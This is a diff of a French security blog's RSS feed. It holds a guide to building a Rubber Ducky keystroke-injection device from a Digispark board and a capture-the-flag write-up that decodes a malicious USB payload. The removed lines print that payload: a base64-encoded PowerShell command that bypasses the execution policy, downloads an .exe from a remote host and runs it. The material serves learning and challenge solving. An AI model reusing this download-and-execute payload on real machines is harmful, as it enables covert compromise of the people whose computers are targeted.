@@ -1,98 +1,27 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>Rubber Ducky on KIRÔN</title>
-        <link>http://localhost:1313/tags/rubber-ducky/</link>
-        <description>Recent content in Rubber Ducky on KIRÔN</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <language>fr</language>
-        <copyright>Enzo Ribeiro</copyright>
-        <lastBuildDate>Wed, 18 Feb 2026 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/rubber-ducky/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>Rubber Ducky pour 2€</title>
-        <link>http://localhost:1313/p/rubber-ducky-pour-2/</link>
-        <pubDate>Wed, 18 Feb 2026 00:00:00 +0000</pubDate>
-        
-        <guid>http://localhost:1313/p/rubber-ducky-pour-2/</guid>
-        <description>&lt;h2 id=&#34;cest-quoi-&#34;&gt;C&amp;rsquo;est quoi ?
-&lt;/h2&gt;&lt;p&gt;Une Rubber Ducky est une clef USB un peu spécial, en effet, elle est détecté par l&amp;rsquo;ordinateur comme un clavier, ce qui peut nous permettre d&amp;rsquo;y introduire des scripts qui exécute des frappes de clavier.&lt;/p&gt;
-&lt;h2 id=&#34;installation&#34;&gt;Installation
-&lt;/h2&gt;&lt;p&gt;Tout d&amp;rsquo;abord il faut se rendre sur le site d&amp;rsquo;Arduino dans la section &lt;code&gt;software&lt;/code&gt; :
-&lt;a class=&#34;link&#34; href=&#34;https://www.arduino.cc/en/software/#ide&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://www.arduino.cc/en/software/#ide&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Une fois installer, nous pouvons lancer le logiciel et passer à la configuration.&lt;/p&gt;
-&lt;h2 id=&#34;configuration&#34;&gt;Configuration
-&lt;/h2&gt;&lt;p&gt;Pour configurer notre digispark il faut d&amp;rsquo;abord ajouter le bon packages sur le logiciel.
-Pour faire ça il nous suffit de suivre les étapes ci-dessous :&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Aller dans &lt;code&gt;Arduino IDE&lt;/code&gt; en haut à droite (Je suis sur Mac, je vous met un tuto plutôt bien détaillé pour Linux et Windows)&lt;/li&gt;
-&lt;li&gt;Cliquer sur &lt;code&gt;Préférences&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Dans &lt;code&gt;Additional boards manager URLs&lt;/code&gt; on ajoute ce lien &lt;code&gt;https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json&lt;/code&gt; (c&amp;rsquo;est un lien mirroir de l&amp;rsquo;officiel, de mon côté impossible de joindre le lien officiel)&lt;/li&gt;
-&lt;li&gt;Puis cliquer sur &lt;code&gt;OK&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Une fois le packages &lt;code&gt;Digistump&lt;/code&gt; installé, il le faut télécharger dans &lt;code&gt;Board Manager&lt;/code&gt;, pour ça il faut :&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Aller dans &lt;code&gt;Tools&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Puis dans &lt;code&gt;Board: &lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Sélectionner &lt;code&gt;Board Manager&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Un menu à gauche va s&amp;rsquo;ouvrir, il faut rechercher &lt;code&gt;Digistump AVR Board&lt;/code&gt; et le télécharger.&lt;/li&gt;
-&lt;li&gt;Une ça fait nous devons aller sélectionner notre digispark, nous suivrons le même chemin, donc &lt;code&gt;Tools &amp;gt; Board:&lt;/code&gt; mais ici nous allons aller dans : &lt;code&gt;Digistump AVR Boards &amp;gt; Digispark&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Maintenant nous avons notre &amp;ldquo;Rubber Ducky&amp;rdquo;. Nous pouvons y mettre nos script personnalisé ou prendre ceux des personnes de la communauté.&lt;/p&gt;
-&lt;p&gt;Pour faire vos scripts, je vous conseil ce site &lt;code&gt;https://cedarctic.github.io/digiQuack/&lt;/code&gt; il permet d&amp;rsquo;écrire les scripts en &lt;code&gt;Duckyscript&lt;/code&gt; (bien plus simple) et il les convertiras en script Digispark.&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title>Chall - Vilan Petit Canard</title>
-        <link>http://localhost:1313/p/chall-vilan-petit-canard/</link>
-        <pubDate>Wed, 04 Feb 2026 00:00:00 +0000</pubDate>
-        
-        <guid>http://localhost:1313/p/chall-vilan-petit-canard/</guid>
-        <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction
-&lt;/h2&gt;&lt;p&gt;L’ordinateur du DSI semble avoir été compromis en interne. Les soupçons se portent sur un jeune stagiaire mécontent de ne pas avoir été payé durant son stage. Une étrange clé USB contenant un fichier binaire a été retrouvée sur le bureau du stagiaire. Le DSI compte sur vous pour analyser ce fichier.&lt;/p&gt;
-&lt;h2 id=&#34;recherche&#34;&gt;Recherche
-&lt;/h2&gt;&lt;p&gt;Nous avons un fichier : &lt;code&gt;file.bin&lt;/code&gt;. En lançant les commandes de bases (&lt;code&gt;file&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, &lt;code&gt;hexdump&lt;/code&gt;, &lt;code&gt;xxd&lt;/code&gt; &amp;hellip;) nous pouvons remarquer que la structure du fichier ressemble fortement à un fichier Rubber Ducky encodé (ex : &lt;code&gt;00ff 00ff 00ff&lt;/code&gt; = Padding HID).&lt;/p&gt;
-&lt;p&gt;Nous pouvons décoder le fichier avec le tools &lt;code&gt;https://github.com/kevthehermit/DuckToolkit&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Bash&#34; data-lang=&#34;Bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/kevthehermit/DuckToolkit.git
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; DuckToolkit
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 setup.py install
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Une fois installé, nous pouvons lancer la commane suivante :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Bash&#34; data-lang=&#34;Bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 ducktools.py -d -l gb ../Chall/file.bin output.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Nous pouvons afficher le fichier &lt;code&gt;output.txt&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Bash&#34; data-lang=&#34;Bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat output.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### La partie qui m&amp;#39;intéresse : &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;powershell Start-Process powershell -Verb runAsDELAY
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Nous pouvons nous rendre sur &lt;code&gt;https://gchq.github.io/CyberChef/&lt;/code&gt; pour décoder le &lt;code&gt;base64&lt;/code&gt; ce qui nous donne le lien d&amp;rsquo;un &lt;code&gt;.exe&lt;/code&gt;. En le téléchargeant et en l&amp;rsquo;exécutant nous avons le flag pour valider le challenge.&lt;/p&gt;
-</description>
-        </item>
-        
-    </channel>
+  <channel>
+    <title>Rubber Ducky on KIRÔN</title>
+    <link>http://localhost:1313/tags/rubber-ducky/</link>
+    <description>Recent content in Rubber Ducky on KIRÔN</description>
+    <generator>Hugo</generator>
+    <language>fr</language>
+    <copyright>Enzo Ribeiro</copyright>
+    <lastBuildDate>Wed, 18 Feb 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/rubber-ducky/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Rubber Ducky pour 2€</title>
+      <link>http://localhost:1313/p/rubber-ducky-pour-2/</link>
+      <pubDate>Wed, 18 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/p/rubber-ducky-pour-2/</guid>
+      <description>&lt;h2 id=&#34;cest-quoi-&#34;&gt;C&amp;rsquo;est quoi ?&lt;/h2&gt;&#xA;&lt;p&gt;Une Rubber Ducky est une clef USB un peu spécial, en effet, elle est détecté par l&amp;rsquo;ordinateur comme un clavier, ce qui peut nous permettre d&amp;rsquo;y introduire des scripts qui exécute des frappes de clavier.&lt;/p&gt;&#xA;&lt;h2 id=&#34;installation&#34;&gt;Installation&lt;/h2&gt;&#xA;&lt;p&gt;Tout d&amp;rsquo;abord il faut se rendre sur le site d&amp;rsquo;Arduino dans la section &lt;code&gt;software&lt;/code&gt; :&#xA;&lt;a href=&#34;https://www.arduino.cc/en/software/#ide&#34;&gt;https://www.arduino.cc/en/software/#ide&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Une fois installer, nous pouvons lancer le logiciel et passer à la configuration.&lt;/p&gt;&#xA;&lt;h2 id=&#34;configuration&#34;&gt;Configuration&lt;/h2&gt;&#xA;&lt;p&gt;Pour configurer notre digispark il faut d&amp;rsquo;abord ajouter le bon packages sur le logiciel.&#xA;Pour faire ça il nous suffit de suivre les étapes ci-dessous :&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Chall - Vilan Petit Canard</title>
+      <link>http://localhost:1313/p/chall-vilan-petit-canard/</link>
+      <pubDate>Wed, 04 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/p/chall-vilan-petit-canard/</guid>
+      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;&#xA;&lt;p&gt;L’ordinateur du DSI semble avoir été compromis en interne. Les soupçons se portent sur un jeune stagiaire mécontent de ne pas avoir été payé durant son stage. Une étrange clé USB contenant un fichier binaire a été retrouvée sur le bureau du stagiaire. Le DSI compte sur vous pour analyser ce fichier.&lt;/p&gt;&#xA;&lt;h2 id=&#34;recherche&#34;&gt;Recherche&lt;/h2&gt;&#xA;&lt;p&gt;Nous avons un fichier : &lt;code&gt;file.bin&lt;/code&gt;. En lançant les commandes de bases (&lt;code&gt;file&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, &lt;code&gt;hexdump&lt;/code&gt;, &lt;code&gt;xxd&lt;/code&gt; &amp;hellip;) nous pouvons remarquer que la structure du fichier ressemble fortement à un fichier Rubber Ducky encodé (ex : &lt;code&gt;00ff 00ff 00ff&lt;/code&gt; = Padding HID).&lt;/p&gt;</description>
+    </item>
+  </channel>
 </rss>
